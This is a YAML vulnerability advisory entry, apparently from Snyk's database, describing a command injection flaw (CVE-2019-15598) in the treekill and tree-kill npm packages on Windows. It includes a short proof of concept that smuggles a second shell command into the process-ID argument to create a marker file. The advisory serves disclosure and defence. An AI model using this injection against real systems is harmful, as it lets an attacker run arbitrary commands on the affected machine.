---
- id: snykio:npm:treekill:536805
  title: Command Injection
  description: |
    [treekill][1] is a package for treekill process and it\'s all children
    and child offspring children.

    Affected versions of this package are vulnerable to Command Injection.
    User input is concatenated with a `command` within `tree-kill` and
    `treekill` that will be executed without any check.

    Note: This vulnerability is only applicable if the package is used on a
    Windows operating system.

    ### PoC by mik317   {#poc-by-mik317}

    1) Create this POC file

        //poc.js
        var kill = require('tree-kill');
        kill('3333332 & echo "HACKED" > HACKED.txt & ');

    2) Execute the following commands in another terminal:

        npm i tree-kill # Install affected module
        dir # Check *HACKED.txt* doesn't exist
        node poc.js #  Run the PoC
        dir # Now *HACKED.txt* exists :)

    3) A new file called `HACKED.txt` will be created, containing the
    `HACKED` string



    [1]: https://www.npmjs.com/package/treekill
  affected_package: treekill
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cve:
  - CVE-2019-15598
  - CVE-2019-15599
  cwe:
  - CWE-78
  disclosed_date: 2019-12-04
  created_date: 2019-12-05
  last_modified_date: 2019-12-05
  credit:
  - mik317
  references:
  - https://github.com/node-modules/treekill/blob/master/index.js#L32
  - https://github.com/pkrumins/node-tree-kill/blob/master/index.js#L20
  - https://github.com/pkrumins/node-tree-kill/commit/ff73dbf144c4c2daa67799a50dfff59cd455c63c
  - https://hackerone.com/reports/701183
  - https://hackerone.com/reports/703415
  source_url: https://snyk.io/vuln/SNYK-JS-TREEKILL-536805
